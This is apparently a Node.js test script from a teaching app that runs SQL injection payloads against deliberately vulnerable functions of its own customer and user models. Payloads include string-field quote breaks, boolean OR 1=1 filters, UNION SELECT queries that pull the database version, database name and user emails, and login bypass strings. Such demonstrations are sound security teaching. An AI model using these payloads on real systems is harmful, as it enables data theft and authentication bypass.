const customerModel = require('../models/customer-model');
const userModel = require('../models/user-model');
const { pool } = require('../config/db');

// Helper function to display results
function displayResults(title, data) {
  console.log(`\n=== ${title} ===`);
  console.log(JSON.stringify(data, null, 2));
  console.log("=============================================");
}

async function testSQLInjection() {
  console.log('======================================================');
  console.log('MYSQL-FRIENDLY SQL INJECTION TEST');
  console.log('Demonstrations that work with MySQL connector defaults');
  console.log('======================================================');
  
  try {
    // First, check if we have a user
    console.log('\nChecking for an existing user...');
    const connection = await pool.getConnection();
    let userId = 1; // Default user ID to try
    
    try {
      const [users] = await connection.query('SELECT user_id FROM users LIMIT 1');
      if (users.length > 0) {
        userId = users[0].user_id;
        console.log(`Found existing user with ID: ${userId}`);
      } else {
        console.log('No existing users found. Creating a test user...');
        const testUser = await userModel.createUserSecure(
          "Test", 
          "User", 
          "test.user@example.com", 
          "StrongP@ss123!"
        );
        
        if (testUser.success) {
          userId = testUser.userId;
          console.log(`Created test user with ID: ${userId}`);
        } else {
          console.log('Failed to create test user. Using default ID 1.');
        }
      }
    } catch (error) {
      console.error('Error checking for users:', error.message);
    } finally {
      connection.release();
    }
    
    // Create a test customer for the user to ensure there's data
    console.log('\nCreating a test customer...');
    try {
      const customer = await customerModel.createCustomerSecure(
        {
          firstName: "Test",
          lastName: "Customer",
          email: "test.customer@example.com",
          phone: "123-456-7890",
          address: "123 Test St",
          package: "Test Package"
        },
        userId
      );
      
      if (customer.success) {
        console.log(`Created test customer with ID: ${customer.customerId}`);
      } else {
        console.log('Failed to create test customer:', customer.error || customer.message);
      }
    } catch (error) {
      console.error('Error creating test customer:', error.message);
    }
    
    // DEMONSTRATION 1: SQL Injection in String Fields
    console.log('\n======= DEMO 1: SQL INJECTION IN STRING FIELDS =======');
    console.log('This demonstrates how malformed inputs can manipulate SQL queries');
    
    // These payloads are for customerModel.createCustomerVulnerable
    const injectionCustomers = [
      // 1. Basic customer for comparison
      {
        firstName: "Normal",
        lastName: "Customer",
        email: "normal@example.com",
        phone: "123-456-7890",
        address: "123 Normal St",
        package: "Basic Package"
      },
      
      // 2. Simple quote termination test
      {
        firstName: "Quote'Test",
        lastName: "Customer",
        email: "quote@example.com",
        phone: "123-456-7890",
        address: "123 Quote St",
        package: "Basic Package"
      },
      
      // 3. More malicious but MySQL-friendly payload
      {
        firstName: "Evil' -- ",
        lastName: "Customer",
        email: "evil@example.com",
        phone: "123-456-7890",
        address: "123 Evil St",
        package: "Basic Package"
      }
    ];
    
    for (let i = 0; i < injectionCustomers.length; i++) {
      const customerData = injectionCustomers[i];
      console.log(`\nTesting customer creation payload ${i+1}: ${customerData.firstName}`);
      
      try {
        const result = await customerModel.createCustomerVulnerable(customerData, userId);
        displayResults(`Customer creation results for payload ${i+1}`, result);
      } catch (error) {
        console.log(`Error with customer creation payload ${i+1}: ${error.message}`);
        // Display the SQL that caused the error
        if (error.sql) {
          console.log('Failed SQL:', error.sql);
        }
      }
    }
    
    // DEMONSTRATION 2: Boolean-based SQL Injection
    console.log('\n======= DEMO 2: BOOLEAN-BASED SQL INJECTION =======');
    
    // These payloads are for getAllCustomersForUserVulnerable
    // Function has query: SELECT * FROM customers WHERE user_id = ${userId}
    const userIdPayloads = [
      // 1. Basic normal query
      `${userId}`,
      
      // 2. OR condition to bypass user_id filter
      `${userId} OR 1=1`,
      
      // 3. Use conditional logic
      `${userId} AND 1=1`,
      
      // 4. Always false condition
      `${userId} AND 1=0`
    ];
    
    for (let i = 0; i < userIdPayloads.length; i++) {
      const payload = userIdPayloads[i];
      console.log(`\nTesting getAllCustomersForUserVulnerable payload ${i+1}: ${payload}`);
      
      try {
        const result = await customerModel.getAllCustomersForUserVulnerable(payload);
        console.log(`Query successful! Found ${result.customers ? result.customers.length : 0} results`);
        displayResults(`Results for payload ${i+1}`, result);
      } catch (error) {
        console.log(`Error with userId payload ${i+1}: ${error.message}`);
        if (error.sql) {
          console.log('Failed SQL:', error.sql);
        }
      }
    }
    
    // DEMONSTRATION 3: UNION-based SQL Injection
    console.log('\n======= DEMO 3: UNION-BASED SQL INJECTION =======');
    
    // These payloads are for getAllCustomersForUserVulnerable
    const unionPayloads = [
      // 1. Basic UNION query (matching column count)
      `${userId} UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL`,
      
      // 2. UNION to extract version
      `${userId} UNION SELECT NULL, version(), NULL, NULL, NULL, NULL, NULL`,
      
      // 3. UNION to extract database name
      `${userId} UNION SELECT NULL, database(), NULL, NULL, NULL, NULL, NULL`,
      
      // 4. UNION to extract user table information
      `${userId} UNION SELECT NULL, email, first_name, last_name, NULL, NULL, NULL FROM users`
    ];
    
    for (let i = 0; i < unionPayloads.length; i++) {
      const payload = unionPayloads[i];
      console.log(`\nTesting UNION-based payload ${i+1}: ${payload}`);
      
      try {
        const result = await customerModel.getAllCustomersForUserVulnerable(payload);
        console.log(`Query successful! Found ${result.customers ? result.customers.length : 0} results`);
        displayResults(`Results for UNION payload ${i+1}`, result);
      } catch (error) {
        console.log(`Error with UNION payload ${i+1}: ${error.message}`);
        if (error.sql) {
          console.log('Failed SQL:', error.sql);
        }
      }
    }
    
    // DEMONSTRATION 4: Login bypass
    console.log('\n======= DEMO 4: LOGIN BYPASS SQL INJECTION =======');
    
    // Add a known user for testing login
    let testEmail = "test.login@example.com";
    let testPassword = "Password123!";
    
    try {
      // First check if the test user exists
      const existingUser = await userModel.findUserByEmail(testEmail);
      
      if (!existingUser.success) {
        console.log(`Creating test user for login with email: ${testEmail}`);
        await userModel.createUserSecure(
          "Login", 
          "Tester", 
          testEmail, 
          testPassword
        );
      } else {
        console.log(`Test user for login already exists with email: ${testEmail}`);
      }
      
      // Try normal login first
      console.log(`\nTrying normal login with correct credentials...`);
      const normalLogin = await userModel.verifyUserVulnerable(testEmail, testPassword);
      displayResults("Normal login result", normalLogin);
      
      // Now try SQL injection login bypass payloads
      const loginPayloads = [
        `' OR 1=1 -- `,
        `' OR '1'='1`,
        `${testEmail}' -- `,
        `anything' OR email='${testEmail}`
      ];
      
      for (let i = 0; i < loginPayloads.length; i++) {
        const payload = loginPayloads[i];
        console.log(`\nTesting login bypass payload ${i+1}: ${payload}`);
        
        try {
          const result = await userModel.verifyUserVulnerable(payload, "anything");
          displayResults(`Login results for payload ${i+1}`, result);
        } catch (error) {
          console.log(`Error with login payload ${i+1}: ${error.message}`);
          if (error.sql) {
            console.log('Failed SQL:', error.sql);
          }
        }
      }
      
    } catch (error) {
      console.error("Error in login testing:", error);
    }
    
  } catch (error) {
    console.error('\nAn error occurred during testing:', error);
  } finally {
    // Close the connection pool
    await pool.end();
    console.log('\n======================================================');
    console.log('SQL INJECTION TESTING COMPLETED');
    console.log('======================================================');
  }
}

// Run the tests
testSQLInjection();